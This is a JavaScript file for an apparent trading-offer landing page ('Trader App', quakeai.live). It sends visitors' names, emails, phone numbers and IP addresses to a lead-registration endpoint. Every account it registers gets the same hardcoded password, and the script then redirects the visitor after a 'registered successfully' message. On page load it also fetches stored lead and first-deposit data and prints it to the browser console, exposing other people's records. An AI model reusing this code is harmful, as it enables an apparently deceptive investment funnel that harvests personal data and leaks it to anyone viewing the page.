// In-memory database
let leadDatabase = {};
let countryCode;

// Country code to ISO map (expanded)
const countryPhoneToISO = {
  "+64": "NZ",
  "+1": "US",
  "+61": "AU",
  "+65": "SG",
  "+44": "GB",
  "+353": "IE",
  "+45": "DK",
  "+46": "SE",
  "+358": "FI",
  "+31": "NL",
  "+49": "DE",
  "+43": "AT",
  "+39": "IT",
  "+34": "ES",
  "+33": "FR",
  "+351": "PT",
  "+48": "PL",
  "+47": "NO",
  "+32": "BE",
  "+41": "CH",
  "+30": "GR",
  "+36": "HU",
  "+40": "RO",
  "+90": "TR",
  "+55": "BR",
  "+52": "MX",
  "+91": "IN",
  "+81": "JP",
  "+82": "KR",
  "+86": "CN",
  "+7": "RU",
  "+420": "CZ",
  "+421": "SK",
  "+385": "HR",
  "+386": "SI",
  "+372": "EE",
  "+371": "LV",
  "+370": "LT",
  "+356": "MT",
  "+357": "CY",
  "+60": "MY",
  "+66": "TH",
  "+63": "PH",
  "+62": "ID",
  "+27": "ZA",
  "+234": "NG",
  "+254": "KE",
  "+20": "EG",
  "+971": "AE",
  "+966": "SA",
};

// Dynamically add CSS for the overlay
const style = document.createElement("style");
style.type = "text/css";
style.innerHTML = `
  .overlay {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.7);
    z-index: 9999;
  }
  .loader {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
  }
  .overlay-message {
    position: absolute;
    top: 60%;
    left: 50%;
    transform: translate(-50%, -50%);
    color: white;
    font-size: 24px;
  }
`;
document.head.appendChild(style);

// Create overlay and loader
const overlay = document.createElement("div");
overlay.className = "overlay";
const loader = document.createElement("div");
loader.className = "loader";
loader.innerHTML = '<img src="loader.gif">';
const message = document.createElement("div");
message.className = "overlay-message";
overlay.appendChild(loader);
overlay.appendChild(message);
document.body.appendChild(overlay);

document.addEventListener("DOMContentLoaded", async () => {
  // Fetch country code
  try {
    const response = await fetch("https://geinfoinfo.mrtinaixii.workers.dev/");
    countryCode = await response.text();
  } catch (error) {
    console.error("Error fetching country code:", error);
    return;
  }

  // Generate or extract clickid
  const urlParams = new URLSearchParams(window.location.search);
  let clickid = urlParams.get("clickid");
  if (!clickid) {
    clickid = generateUniqueClickId();
    urlParams.set("clickid", clickid);
    window.location.replace(`${window.location.pathname}?${urlParams}`);
    return;
  }

  const formContainer = document.getElementById("req-form-section");
  const investForm = document.querySelector('[data-id="form"]');
  const domainName = "quakeai.live";
  const apiName = "ch";

  const phoneInput = document.getElementById("phone");
  if (phoneInput) {
    phoneInput.placeholder = "Phone Number";
  }

  investForm.addEventListener("submit", async (e) => {
    e.preventDefault();
    overlay.style.display = "block";
    message.innerText = "Registering you on the best brand...";

    const clientIP = await fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => data.ip);

    const formData = {
      email: document.getElementById("emailokobo").value,
      firstName: document.getElementById("first_name").value,
      lastName: document.getElementById("last_name").value,
      password: "735tgtGFE",
      offerName: "Trader App",
      offerWebsite: "Traderapp.com",
      custom1: "",
      custom2: "",
      custom3: "",
      ip: clientIP,
      phone: document.getElementById("phone").value,
    };

    try {
      const response = await fetch(
        `https://${domainName}/${apiName}/reg_leads.php`,
        {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams(formData).toString(),
          redirect: "follow",
        },
      );
      const leadData = await response.json();

      if (
        leadData &&
        leadData.response &&
        leadData.response.details &&
        leadData.response.details.redirect &&
        leadData.response.details.redirect.url
      ) {
        message.innerText = "We have registered you successfully.";

        setTimeout(() => {
          window.location.href = leadData.response.details.redirect.url;
        }, 3000);
      } else {
        console.log("Lead registration failed or redirect URL not found.");
        message.innerText =
          "Lead registration failed or redirect URL not found.";
      }
    } catch (error) {
      console.error("API Error:", error);
      message.innerText = "An error occurred while processing your request.";
    } finally {
      setTimeout(() => {
        overlay.style.display = "none";
      }, 3000);
    }
  });

  function generateUniqueClickId() {
    const length = Math.floor(Math.random() * 7) + 9;
    const chars =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return `clickid_${result}`;
  }

  async function getLeads(fromDate, toDate) {
    try {
      const url = `https://${domainName}/${apiName}/leads_proxy.php?fromDate=${encodeURIComponent(fromDate)}&toDate=${encodeURIComponent(toDate)}`;
      const response = await fetch(url);

      if (!response.ok) {
        console.error(`HTTP error! status: ${response.status}`);
        return;
      }

      const data = await response.json();
      return data;
    } catch (error) {
      console.error("Error fetching leads:", error);
    }
  }

  async function getFTDs(fromDate, toDate) {
    try {
      const url = `https://${domainName}/${apiName}/ftd_proxy.php?fromDate=${encodeURIComponent(fromDate)}&toDate=${encodeURIComponent(toDate)}`;
      const response = await fetch(url);

      if (!response.ok) {
        console.error(`HTTP error! status: ${response.status}`);
        return;
      }

      const data = await response.json();
      return data;
    } catch (error) {
      console.error("Error fetching FTDs:", error);
    }
  }

  const fromDate = "2026-02-22 00:00:00";
  const toDate = "2026-04-21 23:22:49";
  getLeads(fromDate, toDate).then((data) => {
    if (data) {
      console.log("Received leads:", data);
    }
  });

  const fromDateFTDs = "2026-02-22 00:00:00";
  const toDateFTDs = "2026-04-21 23:59:59";
  getFTDs(fromDateFTDs, toDateFTDs).then((data) => {
    if (data) {
      console.log("Received FTDs:", data);
    }
  });
});
